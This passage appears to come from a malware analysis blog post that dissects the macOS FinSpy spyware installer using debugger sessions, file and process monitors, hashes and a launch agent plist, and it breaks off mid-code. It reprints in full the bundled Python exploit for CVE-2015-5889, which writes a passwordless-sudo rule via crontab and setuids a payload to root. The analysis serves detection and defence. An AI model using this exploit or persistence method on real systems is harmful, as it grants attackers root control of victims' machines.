<div style="border: 1px solid gray; border-radius: 4px; padding-left:25px; padding-right:25px; overflow-wrap: break-word; background-color:#2A2E35; color:lime;">
    <pre style="font-size: 18px;">
(lldb) Process 1486 stopped
* thread #1, queue = 'com.apple.main-thread'
  stop reason = breakpoint 5.1:
->  0x100003106 <+1501>: callq  *%r12
    0x100003109 <+1504>: movq   %r13, %rdi
    0x10000310c <+1507>: callq  *0x2cf7e(%rip)
    0x100003112 <+1513>: movq   %r15, %rdi

(lldb) x/s $rsi
0x10002bc9c: "unzip:to:"

(lldb) po $rdx
/Users/user/Library/Caches/arch.zip

(lldb) po $rcx
/Users/user/Library/Caches
</pre>
</div>
<p>Looks like it will unzip a file named <code>arch.zip</code> into the user&rsquo;s <code>/Library/Caches</code> directory.</p>
<p>If we then step over this method call (via the <code>si</code> debugger command), our <a href="https://objective-see.com/products/utilities.html#FileMonitor">File Monitor</a> picks up the file events related to the extraction of the (<code>arch.zip</code>) archive:</p>
<div style="border: 1px solid gray; border-radius: 4px; padding-left:25px; padding-right:25px; overflow-wrap: break-word; background-color:#2A2E35; color:lime;">
    <pre style="font-size: 18px;">
# FileMonitor.app/Contents/MacOS/FileMonitor -pretty -filter installer
Password:
{
  "event" : "ES_EVENT_TYPE_NOTIFY_OPEN",
  "file" : {
    "destination" : "/Users/user/Library/Caches/arch.zip",
    "process" : {
      
      "path" : "/Volumes/caglayan-macos/Install CÃßagÃÜlayan.app/
                 Contents/MacOS/.log/ARA0848.app/Contents/MacOS/installer",
    ...
},
{
  "event" : "ES_EVENT_TYPE_NOTIFY_CREATE",
  "file" : {
    "destination" : "/Users/user/Library/Caches/org.logind.ctp.archive",
    "process" : {
      
      "path" : "/Volumes/caglayan-macos/Install CÃßagÃÜlayan.app/
                 Contents/MacOS/.log/ARA0848.app/Contents/MacOS/installer",
    ...
}

...

</pre>
</div>
<p>Hooray, the malware has (kindly) decrypted and unzipped the archive to <code>~/Library/Caches/org.logind.ctp.archive</code>.
&hellip;and it is full of goodies:</p>
<img src="../images/blog/blog_0x4F/archive.png"  width="" class="center" style="border-radius: 4px;">

<p>The <code>file</code> command can identify each item&rsquo;s file type:</p>
<div style="border: 1px solid gray; border-radius: 4px; padding-left:25px; padding-right:25px; overflow-wrap: break-word; background-color:#2A2E35; color:lime;">
    <pre style="font-size: 18px;">
$ file *
helper:            Mach-O 64-bit executable x86_64
helper2:           Python script text executable, ASCII text
helper3:           Mach-O executable i386
installer:         Mach-O 64-bit executable x86_64
logind:            Mach-O 64-bit executable x86_64
logind.kext:       directory
logind.plist:      XML 1.0 document text, ASCII text
storage.framework: directory
</pre>
</div>
<p>Several of these are described in the Amnesty <a href="https://www.amnesty.org/en/latest/research/2020/09/german-made-finspy-spyware-found-in-egypt-and-mac-and-linux-versions-revealed/">writeup</a>, however, others were not.</p>
<ul>
<li>
<p><code>helper</code> (<code>sha1: 72cb14bc737a9d77c040affa60521686ffa80b84</code>):
<br>
A Mach-O binary that exploits a local privilege escalation vulnerability (in macOS &lt; <code>10.9/10</code>).
<br>
<br>
Exploit PoC code: <a href="https://www.exploit-db.com/exploits/36739">https://www.exploit-db.com/exploits/36739</a>.</p>
</li>
<li>
<p><code>helper2</code> (<code>sha1: 9a0ede8fad59e7252502881554be0c21972238c9</code>):
<br>
A python script that exploits <code>CVE-2015-5889</code>
<br>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Python" data-lang="Python"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1</span><span><span style="color:#75715e"># CVE-2015-5889: issetugid() + rsh + libmalloc osx local root</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2</span><span><span style="color:#75715e"># tested on osx 10.9.5 / 10.10.5</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3</span><span><span style="color:#75715e"># jul/2015</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4</span><span><span style="color:#75715e"># by rebel</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6</span><span><span style="color:#f92672">import</span> os<span style="color:#f92672">,</span>time<span style="color:#f92672">,</span>sys
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8</span><span><span style="color:#f92672">from</span> sys <span style="color:#f92672">import</span> argv
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9</span><span>script, param <span style="color:#f92672">=</span> argv
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11</span><span>env <span style="color:#f92672">=</span> {}
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13</span><span>s <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>stat(<span style="color:#e6db74">&#34;/etc/sudoers&#34;</span>)<span style="color:#f92672">.</span>st_size
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15</span><span>env[<span style="color:#e6db74">&#39;MallocLogFile&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;/etc/crontab&#39;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16</span><span>env[<span style="color:#e6db74">&#39;MallocStackLogging&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;yes&#39;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17</span><span>env[<span style="color:#e6db74">&#39;MallocStackLoggingDirectory&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;a</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">* * * * * root echo &#34;ALL ALL=(ALL) NOPASSWD: </span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18</span><span>                                      ALL<span style="color:#e6db74">&#34; &gt;&gt; /etc/sudoers</span><span style="color:#ae81ff">\n\n\n\n\n</span><span style="color:#e6db74">&#39;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20</span><span><span style="color:#75715e">#sys.stderr.write(&#34;creating /etc/crontab..&#34;)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22</span><span>p <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>fork()
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23</span><span><span style="color:#66d9ef">if</span> p <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>:  
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24</span><span>  os<span style="color:#f92672">.</span>close(<span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25</span><span>  os<span style="color:#f92672">.</span>close(<span style="color:#ae81ff">2</span>)
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26</span><span>  os<span style="color:#f92672">.</span>execve(<span style="color:#e6db74">&#34;/usr/bin/rsh&#34;</span>,[<span style="color:#e6db74">&#34;rsh&#34;</span>,<span style="color:#e6db74">&#34;localhost&#34;</span>],env)
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28</span><span>time<span style="color:#f92672">.</span>sleep(<span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30</span><span><span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#34;NOPASSWD&#34;</span> <span style="color:#f92672">not</span> <span style="color:#f92672">in</span> open(<span style="color:#e6db74">&#34;/etc/crontab&#34;</span>)<span style="color:#f92672">.</span>read():
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31</span><span>  sys<span style="color:#f92672">.</span>stderr<span style="color:#f92672">.</span>write(<span style="color:#e6db74">&#34;failed</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32</span><span>  sys<span style="color:#f92672">.</span>exit(<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">34</span><span><span style="color:#75715e">#sys.stderr.write(&#34;done\nwaiting for /etc/sudoers to change (&lt;60 seconds)..&#34;)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">35</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">36</span><span><span style="color:#66d9ef">while</span> os<span style="color:#f92672">.</span>stat(<span style="color:#e6db74">&#34;/etc/sudoers&#34;</span>)<span style="color:#f92672">.</span>st_size <span style="color:#f92672">==</span> s:
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">37</span><span><span style="color:#75715e"># sys.stderr.write(&#34;.&#34;) </span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">38</span><span>  time<span style="color:#f92672">.</span>sleep(<span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">39</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">40</span><span><span style="color:#75715e">#sys.stderr.write(&#34;\ndone\n&#34;)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">41</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">42</span><span>my_command <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;sudo chmod 06777 </span><span style="color:#e6db74">%s</span><span style="color:#e6db74"> &amp; sudo chown root:wheel </span><span style="color:#e6db74">%s</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">%</span> (param, param)
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">43</span><span>os<span style="color:#f92672">.</span>system(my_command)</span></span></code></pre></div></p>
</li>
<li>
<p><code>helper3</code> (<code>sha1: 427a1c1daf9030069f0c771ce172c104513a7722</code>):
<br>
A Mach-O binary that exploits the <code>tpwn</code> local privilege escalation vulnerability (in macOS &lt; <code>10.10.5</code>).
<br>
<div style="border: 1px solid gray; border-radius: 4px; padding-left:25px; padding-right:25px; overflow-wrap: break-word; background-color:#2A2E35; color:lime;">
    <pre style="font-size: 18px;">
$ strings -a helper3 

/mach_kernel
/System/Library/Kernels/kernel
/System/Library/Extensions/IOAudioFamily.kext/Contents/MacOS/IOAudioFamily

posix_cred_get
_IORecursiveLockUnlock
__ZN10IOWorkLoop8openGateEv
__ZN13IOEventSource8openGateEv
Escalating privileges! -qwertyoruiop
</pre>
</div>
<br>
Exploit PoC code: <a href="https://github.com/kpwn/tpwn">https://github.com/kpwn/tpwn</a>.
<br></p>
</li>
</ul>
<center>

</center>
<ul>
<li>
<p><code>installer</code> (<code>sha1: a65965b960b3d322bbae467f51bf215d574b00cc</code>):
<br>
The malware installer (details below).</p>
</li>
<li>
<p><code>logind</code> (<code>sha1: 62e5dc40bfabaa712cd9e32ac755384db07f0dab</code>):
<br>
The malware&rsquo;s (persistent) launcher (details below).</p>
</li>
<li>
<p><code>logind.kext</code> (<code>sha1: 18e1d03e41b5fc6d54fdda340fe2dab219502f3d</code>):
<br>
The malware&rsquo;s rootkit (details below).</p>
</li>
<li>
<p><code>logind.plist</code> (<code>sha1: a2aba86d5d763f311dff8250bc8fe98de958bff4</code>):
<br>
The malware&rsquo;s launch agent property list (for persistence):
<br>
<div style="border: 1px solid gray; border-radius: 4px; padding-left:25px; padding-right:25px; overflow-wrap: break-word; background-color:#2A2E35; color:lime;">
    <pre style="font-size: 18px;">
$ cat org.logind.ctp.archive/logind.plist 
&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
&lt;!DOCTYPE plist PUBLIC &quot;-//Apple//DTD PLIST 1.0//EN&quot; &quot;http://www.apple.com/DTDs/PropertyList-1.0.dtd&quot;&gt;
&lt;plist version=&quot;1.0&quot;&gt;
&lt;dict&gt;
  &lt;key&gt;Label&lt;/key&gt;
  &lt;string&gt;org.logind&lt;/string&gt;
  &lt;key&gt;ProgramArguments&lt;/key&gt;
  &lt;array&gt;
    &lt;string&gt;/private/etc/logind&lt;/string&gt;
  &lt;/array&gt;
  &lt;key&gt;RunAtLoad&lt;/key&gt;
  &lt;true/&gt;
  &lt;key&gt;KeepAlive&lt;/key&gt;
  &lt;dict&gt;
    &lt;key&gt;SuccessfulExit&lt;/key&gt;
    &lt;false/&gt;
  &lt;/dict&gt;
&lt;/dict&gt;
&lt;/plist&gt;
</pre>
</div></p>
</li>
</ul>
<p>Let&rsquo;s take a closer look at several of these.</p>
<p>First, the malware performs various actions requiring root privileges &hellip;which is where the local privilege escalation vulnerabilities (<code>helper*</code>) come into play. If the exploits fail (which they will on any recent version of macOS), the malware falls back to a less sophisticated approach:</p>
<blockquote>
"This first stage uses the exploits to get root access. If none of them work, it will ask the user to grant root permissions to launch the next stage installer." -Amnesty International
</blockquote>
<img src="../images/blog/blog_0x4F/ask.png"  width="" class="center" style="border-radius: 4px;">

<p>And what does it do with these root privileges?
Sets the &ldquo;next stage&rdquo; to be owned by root (via <code>chown root:wheel</code>) with the setuid bit set (via <code>chmod 06777</code>):</p>
<div style="border: 1px solid gray; border-radius: 4px; padding-left:25px; padding-right:25px; overflow-wrap: break-word; background-color:#2A2E35; color:lime;">
    <pre style="font-size: 18px;">

$ ls -lart /Users/user/Library/Caches/org.logind.ctp.archive/installer
-rwsrwsrwx  1 root  wheel  63396 Feb 16  2018 /Users/user/Library/Caches/org.logind.ctp.archive/installer

</pre>
</div>
<p>As noted in Pedro&rsquo;s (<a href="https://twitter.com/osxreverser">@osxreverser</a>) writeup, &ldquo;<a href="https://reverse.put.as/2020/09/26/the-finfisher-tales-chapter-1/">The Finfisher Tales, Chapter 1: The dropper</a>&rdquo; this (next stage) installer is then launched via method named <code>installPayload</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ObjC" data-lang="ObjC"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1</span><span><span style="color:#75715e">// @class appAppDelegate 
</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2</span><span><span style="color:#75715e"></span>-(<span style="color:#66d9ef">char</span>)<span style="color:#a6e22e">installPayload</span> {
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3</span><span>    ...
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4</span><span>    r14 <span style="color:#f92672">=</span> [[NSTask alloc] init];
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5</span><span>    rbx <span style="color:#f92672">=</span> [[GIPath installer] <span style="color:#66d9ef">retain</span>];
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6</span><span>    [r14 setLaunchPath:rbx];
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7</span><span>    
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8</span><span>    [r14 launch];
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9</span><span>    [r14 waitUntilExit];
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10</span><span>    ...
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11</span><span>}</span></span></code></pre></div>
<p>This method simply invokes the <code>NSTask</code> API to launch the (next-stage) installer. In a debugger session, we can observe the (launch) path to the &ldquo;next stage&rdquo; installer is <code>/Users/user/Library/Caches/org.logind.ctp.archive/installer</code>:</p>
<div style="border: 1px solid gray; border-radius: 4px; padding-left:25px; padding-right:25px; overflow-wrap: break-word; background-color:#2A2E35; color:lime;">
    <pre style="font-size: 18px;">
% lldb .log/ARA0848.app/Contents/MacOS/installer 

...

* thread #1, queue = 'com.apple.main-thread'

-[appAppDelegate installPayload] + 0x100
->  0x1000035e5 <+100>: callq  *0x2ca9d(%rip)
    0x1000035eb <+106>: movq   %rbx, %rdi
    0x1000035ee <+109>: callq  *0x2ca9c(%rip)
    0x1000035f4 <+115>: movq   0x2def5(%rip), %rsi

Target 0: (installer) stopped.
(lldb) po $rdi
&lt;NSConcreteTask: 0x10024ff30&gt;

(lldb) x/s $rsi
0x7fff720e9b0e: "setLaunchPath:"

(lldb) po $rdx
/Users/user/Library/Caches/org.logind.ctp.archive/installer
</pre>
</div>
<p>This launching of this installer, can also be passively observed via our <a href="https://objective-see.com/products/utilities.html#ProcessMonitor">Process Monitor</a>:</p>
<div style="border: 1px solid gray; border-radius: 4px; padding-left:25px; padding-right:25px; overflow-wrap: break-word; background-color:#2A2E35; color:lime;">
    <pre style="font-size: 18px;">
# ProcessMonitor.app/Contents/MacOS/ProcessMonitor -pretty

{
  "event" : "ES_EVENT_TYPE_NOTIFY_EXEC",
  "process" : {
    
    "path" : "/Users/user/Library/Caches/org.logind.ctp.archive/installer",
    "pid" : 1610

    "ppid" : 1486,

  }
}
</pre>
</div>
<p>&hellip;noting that the parent of the <code>org.logind.ctp.archive/installer</code> process (<code>&quot;ppid&quot;:1486</code>), is indeed <code>.log/ARA0848.app/Contents/MacOS/installer</code>:</p>
<p>Due its owner (root) and the <code>setuid</code> bit, this &ldquo;next stage&rdquo; installer will run with root privileges.</p>
<h3 id="next-stage-installer-orglogindctparchiveinstaller">Next Stage Installer (<code>org.logind.ctp.archive/installer</code>)</h3>
<p>As noted in the Amnesty <a href="https://www.amnesty.org/en/latest/research/2020/09/german-made-finspy-spyware-found-in-egypt-and-mac-and-linux-versions-revealed/">writeup</a>, this installer performs three actions:</p>
<ol>
<li>Copies plugins and config files to <code>/Library/Frameworks/Storage.framework</code>.</li>
<li>Copies the launcher (<code>logind</code>) to <code>/private/etc/logind</code>.</li>
<li>Persists the launcher, by creating a launch agent plist: <code>/System/Library/LaunchAgents/logind.pslist</code>.</li>
</ol>
<p>Let&rsquo;s take a closer look at it now, to highlight the code responsible for these actions.</p>
<p>The <code>org.logind.ctp.archive/installer</code> is a Mach-O binary, rather similar (albeit simpler) than its parent (<code>.log/ARA0848.app/Contents/MacOS/installer</code>).</p>
<p>For example, both contain a custom <code>GIFileOps</code> class that implements various file related methods (<code>copy: to:</code>, <code>loadAgent</code>, etc.).</p>
<p>Moreover, we find the <code>llvm</code>-level obfuscations again:
<img src="../images/blog/blog_0x4F/moreObfuscate.png"  width="75%" class="center" style="border-radius: 4px;">
</p>
<p>This (next stage) installer&rsquo;s main method starts at <code>0x000000010a3d95ac</code>. The logic the the <code>main</code> function first checks for the presence of various files (plugins?), such as <code>/Library/Frameworks/Storage.framework</code>, <code>/Contents/Resources/7f.bundle/Contents/Resources/AAC.dat</code>. It then builds a dictionary of key-value pairs via a call to <code>[GIPath installationMap]</code>:</p>
<div style="border: 1px solid gray; border-radius: 4px; padding-left:25px; padding-right:25px; overflow-wrap: break-word; background-color:#2A2E35; color:lime;">
    <pre style="font-size: 18px;">
$ lldb org.logind.ctp.archive/installer

...
* thread #1, queue = 'com.apple.main-thread'
installer`main:
->  0x10a3da37e <+3538>: callq  *0x6d04(%rip) ;objc_msgSend

(lldb) x/s $rsi
0x10a3df5c7: "<b>installationMap</b>"

(lldb) ni

(lldb) po $rax
{
    "/Users/user/Library/Caches/org.logind.ctp.archive/Storage.framework"
     ‚Üí "/Library/Frameworks/Storage.framework";

    "/Users/user/Library/Caches/org.logind.ctp.archive/logind"
     ‚Üí "/private/etc/logind";

    "/Users/user/Library/Caches/org.logind.ctp.archive/logind.kext"
     ‚Üí "/System/Library/Extensions/logind.kext";
    
    "/Users/user/Library/Caches/org.logind.ctp.archive/logind.plist"
     ‚Üí "/Library/LaunchAgents/logind.plist";
}

</pre>
</div>
<p>As we can see in the debugger output, this maps files from the decrypted uncompressed archive (<code>org.logind.ctp.archive</code>) to their final destinations.
The installer then iterates over each of these files, and via a block (at <code>0x000000010a3da4d2</code>) moves them from the archive to their (final) destinations:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span><span>files <span style="color:#f92672">=</span> [GIPath installationMap];
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2</span><span>[files enumerateKeysAndObjectsUsingBlock:(<span style="color:#66d9ef">void</span> (<span style="color:#f92672">^</span>)(KeyType src, ObjectType dest, BOOL <span style="color:#f92672">*</span>stop))
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3</span><span>{
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5</span><span>   [GIFileOps move:src to:dest];
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6</span><span>   [GIFileOps setStandardAttributes:dest];
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">8</span><span>}];</span></span></code></pre></div>
<p>We can passively observe this via our <a href="https://objective-see.com/products/utilities.html#FileMonitor">File Monitor</a>:
<div style="border: 1px solid gray; border-radius: 4px; padding-left:25px; padding-right:25px; overflow-wrap: break-word; background-color:#2A2E35; color:lime;">
    <pre style="font-size: 18px;">
# FileMonitor.app/Contents/MacOS/FileMonitor -pretty -filter installer
{
  "event" : "ES_EVENT_TYPE_NOTIFY_RENAME",
  "file" : {
    "destination" : "/Library/LaunchAgents/logind.plist",
    "source" : "/Users/user/Library/Caches/org.logind.ctp.archive/logind.plist"
  }
}

{
  "event" : "ES_EVENT_TYPE_NOTIFY_RENAME",
  "file" : {
    "destination" : "/private/etc/logind",
    "source" : "/Users/user/Library/Caches/org.logind.ctp.archive/logind"
  }
}

{
  "event" : "ES_EVENT_TYPE_NOTIFY_RENAME",
  "file" : {
    "destination" : "/System/Library/Extensions/logind.kext",
    "source" : "/Users/user/Library/Caches/org.logind.ctp.archive/logind.kext"
  }
}

{
  "event" : "ES_EVENT_TYPE_NOTIFY_RENAME",
  "file" : {
    "destination" : "/Library/Frameworks/Storage.framework",
    "source" : "/Users/user/Library/Caches/org.logind.ctp.archive/storage.framework"
  }
}

</pre>
</div></p>
<p>Of course (and stop me if you&rsquo;ve heard this before), the creation of a persistence launch agent (<code>/Library/LaunchAgents/logind.plist</code>) is detected by <a href="https://objective-see.com/products/blockblock.html">BlockBlock</a>:</p>
<img src="../images/blog/blog_0x4F/blockblock.png"  width="100%" class="center" style="border-radius: 4px;">

<p>And speaking of the <code>logind.plist</code> let&rsquo;s take a look at it:</p>
<div style="border: 1px solid gray; border-radius: 4px; padding-left:25px; padding-right:25px; overflow-wrap: break-word; background-color:#2A2E35; color:lime;">
    <pre style="font-size: 18px;">

$ cat /Library/LaunchAgents/logind.plist

&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
&lt;!DOCTYPE plist PUBLIC &quot;-//Apple//DTD PLIST 1.0//EN&quot; &quot;http://www.apple.com/DTDs/PropertyList-1.0.dtd&quot;&gt;
&lt;plist version=&quot;1.0&quot;&gt;
&lt;dict&gt;
        &lt;key&gt;Label&lt;/key&gt;
        &lt;string&gt;org.logind&lt;/string&gt;
        &lt;key&gt;ProgramArguments&lt;/key&gt;
        &lt;array&gt;
                &lt;string&gt;<b>/private/etc/logind</b>&lt;/string&gt;
        &lt;/array&gt;
        &lt;key&gt;RunAtLoad&lt;/key&gt;
        &lt;true/&gt;
        &lt;key&gt;KeepAlive&lt;/key&gt;
        &lt;dict&gt;
                &lt;key&gt;SuccessfulExit&lt;/key&gt;
                &lt;false/&gt;
        &lt;/dict&gt;
&lt;/dict&gt;
&lt;/plist&gt;
</pre>
</div>
<p>As the <code>RunAtLoad</code> key is set to <code>true</code>, the binary, <code>/private/etc/logind</code> will be automatically (re)executed each time the system is rebooted an the user logs in.</p>
<p>Once the installer has, well, installed (and setuid&rsquo;d) these various components, it kicks off this persistent launch agent via a call to <code>[GIFileOps loadAgent:]</code></p>
<p>This method simply invokes <code>launchctl</code> with the <code>load</code> command line argument, and path to the <code>logind.plist</code> to:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-objC" data-lang="objC"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1</span><span>+(<span style="color:#66d9ef">char</span>)<span style="color:#a6e22e">loadAgent:</span>(<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)plist {
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2</span><span>    
